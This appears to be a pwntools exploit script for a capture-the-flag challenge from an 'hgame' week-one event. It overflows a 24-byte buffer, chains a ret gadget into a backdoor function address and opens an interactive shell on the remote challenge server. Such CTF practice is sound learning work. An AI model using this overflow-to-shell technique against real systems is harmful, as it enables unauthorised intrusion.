from pwn import * 
from pwn import p64
import socket
from ctypes import *
# context(log_level='DEBUG')
# context(arch='i386',os = 'linux', log_level='DEBUG')flag
context(arch='amd64',os = 'linux')
context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
host = "week-1.hgame.lwsec.cn"
ip = socket.gethostbyname(host)
r = remote(ip,31896)#远程连接
# elf = cdll.LoadLibrary('libc.so.6')
# elf = ELF('./pwn')
# r = process("./vuln")
# gdb.attach(r)
# pause()
backdoor_addr = 0x401176
ret_addr = 0x00040101a



payload = b'A'* 16 + b'junkjunk'+p64(ret_addr)+p64(backdoor_addr)
r.sendline(payload)
r.interactive()
